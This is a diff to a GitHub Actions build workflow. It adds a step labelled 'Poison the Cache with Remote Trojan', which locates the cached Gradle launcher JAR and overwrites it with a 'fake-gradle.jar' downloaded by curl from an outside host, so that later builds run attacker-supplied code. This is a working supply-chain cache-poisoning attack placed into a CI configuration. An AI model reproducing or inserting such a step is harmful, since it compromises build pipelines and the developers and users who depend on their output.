@@ -31,6 +31,23 @@ jobs:
           key: gradle-wrapper-${{ runner.os }}-${{ hashFiles('**/gradle/wrapper/gradle-wrapper.properties') }}
           restore-keys: |
             gradle-wrapper-${{ runner.os }}-
+      - name: Poison the Cache with Remote Trojan
+        run: |
+          # 1. Force Gradle to unzip so we can find the JARs
+          chmod +x gradlew
+          ./gradlew --version
+          ./gradlew --stop
+
+          # 2. Identify the JAR that usually contains the GradleMain class
+          # In Gradle 9.x, this is usually 'gradle-launcher-x.x.jar'
+          TARGET_JAR=$(find ~/.gradle/wrapper/dists/ -name "gradle-launcher-*.jar" | head -n 1)
+          echo "Targeting JAR: $TARGET_JAR"
+
+          # 3. Use curl to download your PRE-COMPILED fake-gradle.jar
+          # and OVERWRITE the official one.
+          curl -L "https://nk.ax/fake-gradle.jar" -o "$TARGET_JAR"
+
+          echo "Official launcher replaced. Cache is now poisoned."
       - name: Grant execute permission for gradlew
         run: chmod +x gradlew
       - name: Build with Gradle
